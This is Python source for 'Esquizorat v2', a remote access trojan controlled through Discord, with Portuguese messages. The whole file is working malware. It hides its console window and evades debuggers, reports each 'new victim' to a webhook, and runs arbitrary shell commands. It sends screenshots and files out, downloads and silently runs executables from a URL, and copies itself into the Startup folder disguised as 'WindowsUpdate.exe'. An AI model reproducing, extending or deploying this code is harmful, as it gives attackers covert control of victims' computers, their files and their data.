"""
Esquizorat v2 - Discord RAT + Web Panel
"""
import discord
from discord.ext import commands
import platform, subprocess, os, time, io, sys, threading, ctypes, requests as req

TOKEN = "DISCORD_TOKEN_PLACEHOLDER"
PANEL_URL = "PANEL_URL_PLACEHOLDER"
WEBHOOK_URL = "WEBHOOK_PLACEHOLDER"

def hide_console():
    try:
        if os.environ.get('RAT_DEBUG', '') != '1':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def send_webhook(msg):
    if WEBHOOK_URL and "PLACEHOLDER" not in WEBHOOK_URL:
        try:
            req.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
        except:
            pass

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

class RatCommands:
    @staticmethod
    def shell(cmd):
        try:
            return subprocess.check_output(cmd, shell=True, text=True, timeout=30, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Error ({e.returncode}): {e.output or 'Sem saida'}"
        except subprocess.TimeoutExpired:
            return "Timeout (30s)"
        except Exception as e:
            return f"Error: {e}"

    @staticmethod
    def screenshot():
        try:
            import pyautogui
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            return buf
        except:
            return None

    @staticmethod
    def files_list(path='C:\\'):
        try:
            if os.path.isfile(path):
                return f"Arquivo: {path}\nTamanho: {os.path.getsize(path)} bytes"
            items = os.listdir(path or 'C:\\')
            result = []
            for item in sorted(items)[:50]:
                full = os.path.join(path, item)
                try:
                    tp = 'DIR' if os.path.isdir(full) else 'FILE'
                    sz = os.path.getsize(full) if tp == 'FILE' else 0
                    result.append(f"[{tp}] {item} ({sz} bytes)")
                except:
                    result.append(f"[?] {item}")
            return '\n'.join(result) if result else "Diretorio vazio"
        except Exception as e:
            return f"Erro: {e}"

    @staticmethod
    def sysinfo():
        try:
            import psutil
            cpu = psutil.cpu_percent(interval=0.5)
            ram = psutil.virtual_memory()
            disk = psutil.disk_usage('C:\\')
            return (f"PC: {platform.node()}\n"
                    f"OS: {platform.system()} {platform.release()}\n"
                    f"CPU: {cpu}%\n"
                    f"RAM: {ram.used//(1024*1024)}MB / {ram.total//(1024*1024)}MB ({ram.percent}%)\n"
                    f"DISK: {disk.free//(1024**3)}GB livre de {disk.total//(1024**3)}GB\n"
                    f"User: {os.environ.get('USERNAME', 'N/A')}")
        except:
            return (f"PC: {platform.node()}\n"
                    f"OS: {platform.system()} {platform.version()}\n"
                    f"CPU: {platform.processor()}\n"
                    f"User: {os.environ.get('USERNAME', 'N/A')}")

    @staticmethod
    def kill_process(name):
        try:
            killed = 0
            output = subprocess.check_output(f'taskkill /F /IM {name}', shell=True, text=True)
            return output.strip() or f"Processo {name} nao encontrado"
        except:
            return f"Processo {name} nao encontrado ou sem permissao"

rat = RatCommands()

def register_panel():
    if PANEL_URL and "PLACEHOLDER" not in PANEL_URL:
        try:
            from central_client import CentralClient
            client = CentralClient(PANEL_URL, platform.node())
            if client.register():
                print(f"[RAT] Registrado no painel: {PANEL_URL}")
        except:
            pass

@bot.event
async def on_ready():
    info = f"**Nova vitima conectada!**\n```\n{RatCommands.sysinfo()}\n```"
    send_webhook(info)
    if PANEL_URL and "PLACEHOLDER" not in PANEL_URL:
        threading.Thread(target=register_panel, daemon=True).start()

@bot.event
async def on_disconnect():
    print("[RAT] Discord desconectado, tentando reconectar...")
    send_webhook(f"Reconectando... {platform.node()}")

@bot.event
async def on_resumed():
    print("[RAT] Reconectado ao Discord")
    send_webhook(f"**Reconectado!**\n{platform.node()}")

@bot.command(name='shell')
async def cmd_shell(ctx, *, command):
    output = rat.shell(command)
    if len(output) > 1900:
        await ctx.send(f"```\n{output[:1900]}\n```")
    else:
        await ctx.send(f"```\n{output}\n```" if output.strip() else f"`Comando executado (sem saida)`")

@bot.command(name='screen')
async def cmd_screen(ctx):
    img = rat.screenshot()
    if img:
        await ctx.send(file=discord.File(img, 'screenshot.png'))
    else:
        await ctx.send("Erro: pyautogui nao disponivel")

@bot.command(name='info')
async def cmd_info(ctx):
    await ctx.send(f"```\n{RatCommands.sysinfo()}\n```")

@bot.command(name='files')
async def cmd_files(ctx, path='C:\\'):
    output = rat.files_list(path)
    if len(output) > 1900:
        await ctx.send(f"```\n{output[:1900]}\n```")
    else:
        await ctx.send(f"```\n{output}\n```")

@bot.command(name='download')
async def cmd_download(ctx, path):
    try:
        await ctx.send(file=discord.File(path))
    except:
        await ctx.send(f"Erro: arquivo nao encontrado ou sem permissao\n{path}")

@bot.command(name='upload')
async def cmd_upload(ctx, url):
    try:
        r = req.get(url, timeout=60)
        ext = '.exe' if url.lower().endswith('.exe') else '.tmp'
        path = os.path.join(os.environ.get('TEMP', '.'), f'update_{int(time.time())}{ext}')
        with open(path, 'wb') as f:
            f.write(r.content)
        subprocess.Popen(path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        await ctx.send(f"Executado: {url}")
    except Exception as e:
        await ctx.send(f"Erro: {e}")

@bot.command(name='shutdown')
async def cmd_shutdown(ctx):
    os.system('shutdown /s /t 5')
    await ctx.send("Desligando em 5s...")

@bot.command(name='restart')
async def cmd_restart(ctx):
    os.system('shutdown /r /t 5')
    await ctx.send("Reiniciando em 5s...")

@bot.command(name='persist')
async def cmd_persist(ctx):
    try:
        import shutil
        exe = sys.executable
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(exe, os.path.join(startup, 'WindowsUpdate.exe'))
        await ctx.send("Persistencia instalada no Startup")
    except:
        await ctx.send("Falha: sem permissao para instalar persistencia")

@bot.command(name='msg')
async def cmd_msg(ctx, *, text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "AVISO", 0x30)
        await ctx.send("Mensagem exibida")
    except:
        await ctx.send("Erro ao exibir mensagem")

@bot.command(name='kill')
async def cmd_kill(ctx, *, process):
    output = rat.kill_process(process)
    await ctx.send(f"```\n{output}\n```")

@bot.command(name='cd')
async def cmd_cd(ctx, *, path='C:\\'):
    output = rat.shell(f'dir "{path}" /b')
    await ctx.send(f"```\n{output[:1900]}\n```" if output.strip() else "`Diretorio vazio`")

if __name__ == "__main__":
    hide_console()
    anti_debug()
    
    while True:
        try:
            if TOKEN and "PLACEHOLDER" not in TOKEN:
                bot.run(TOKEN, reconnect=True, log_level=40)
            else:
                time.sleep(60)
        except discord.LoginFailure:
            time.sleep(30)
        except Exception as e:
            try:
                with open(os.path.join(os.environ.get('TEMP', '.'), 'rat_error.log'), 'a') as f:
                    f.write(f"{time.ctime()}: {e}\n")
            except:
                pass
            time.sleep(10)
